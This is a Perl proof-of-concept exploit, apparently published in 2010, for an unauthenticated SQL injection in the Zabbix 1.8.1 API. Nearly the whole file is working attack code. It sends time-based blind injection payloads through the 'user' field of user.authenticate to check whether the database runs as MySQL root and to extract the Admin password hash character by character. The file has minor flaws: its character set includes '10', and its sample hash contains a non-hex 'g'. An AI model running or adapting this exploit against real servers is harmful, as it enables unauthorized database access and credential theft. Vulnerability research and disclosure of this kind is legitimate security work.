#!/usr/bin/perl

#
# zabbix181api.pl - Zabbix <= 1.8.1 API SQL Injection PoC Exploit
#
# Copyright (c) 2010
# Dawid Golunski <dawid[!]legalhackers.com>
# legalhackers.com
#
# Description
# -----------
# A PoC exploit for Zabbix <= 1.8.1 API (api_jsonrpc.php) prone to
# an sql injection attack allowing unauthenticated users to access
# the backend database.
# The exploit performs a blind time-based sql injection attack to
# retrieve Zabbix Admin's password hash and check if Zabbix uses a
# MySQL root account.
#
# Example
# -----------
# $ ./zabbix181api.pl http://10.0.0.1/zabbix
# Target: http://10.0.0.1/zabbix
# Reqtime: 0.2s ; SleepTime: 0.4s
#
# Checking if zabbix uses mysql root account... No
#
# Extracting Admin's password hash from zabbix users table:
# 5fce1b3c34b520ageffb47ce08a7cd76
# Job done.
#


use Time::HiRes qw(gettimeofday tv_interval);
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;

my $zabbix_api_url = shift || die "No target url provided. Exiting.\n";
$zabbix_api_url .= "/api_jsonrpc.php";
my $ua = LWP::UserAgent->new;
$ua->timeout(8);

sub sendRequest
{
        my ($api_url, $data) = @_;
        my $start_time = [gettimeofday];
        my $response = $ua->request(POST "$api_url",
                Content_Type => "application/json-rpc",
                Content => "$data");
        my $end_time = [gettimeofday];
        my $elapsed_time = tv_interval($start_time,$end_time);
        my $elapsed_time_sec = sprintf "%.1f", $elapsed_time;

        my %result = ("content", $response->content,
                      "code", $response->code,
                      "success", ($response->is_success() ? 1 : 0),
                      "time", $elapsed_time_sec);
        return %result;
}

%result  = sendRequest($zabbix_api_url, "");
if ($result{success} ne 1) {
        die "Could not access zabbix API.\n";
}
my $req_time = $result{time};
my $sleep_time = ($req_time * 2.0);

print "Target: $zabbix_api_url\n";
print "Reqtime: ${req_time}s ; SleepTime: ${sleep_time}s \n\n";

$| = 1;

print "Checking if zabbix uses mysql root account... ";
my $jsondata = '{"auth":null,"method":"user.authenticate","id": 
1,"params":{'.
               '"password":"apitest123",'.
               '"user":"Admin\') ) OR '.
               'if (!strcmp(substring(user(),1,4),\'root\'),sleep('. 
$sleep_time.'),0) '.
               ' -- end "},"jsonrpc":"2.0"}';
%result = sendRequest($zabbix_api_url, $jsondata);
print $result{content};
if ($result{time}  >= $sleep_time) {
        print "Yes!\n\n";
} else {
        print "No\n\n";
}

my $username = "Admin";
my @chars = (0 .. 10, "a" .. "f");
my $md5_hash = "";
print "Extracting Admin's password hash from zabbix users table:\n";
for (my $offset=1; $offset<=32; $offset++) {
     for (my $idx=0; $idx<(scalar @chars); $idx++) {
        $jsondata = '{"auth":null,"method":"user.authenticate","id": 
1,"params":{'.
                       '"password":"apitest123",'.
                       '"user":"'.$username.'\') ) AND '.
                       'if (!strcmp(substring(u.passwd,'.$offset.',1),\''. 
$chars[$idx].'\'),sleep('.$sleep_time.'),0) '.
                       ' -- end "},"jsonrpc":"2.0"}';
        %result = sendRequest($zabbix_api_url, $jsondata);
        if ($result{time}  >= $sleep_time) {
                $md5_hash .= $chars[$idx];
                print $chars[$idx];
        }
     }
}
print "\nJob done.\n";

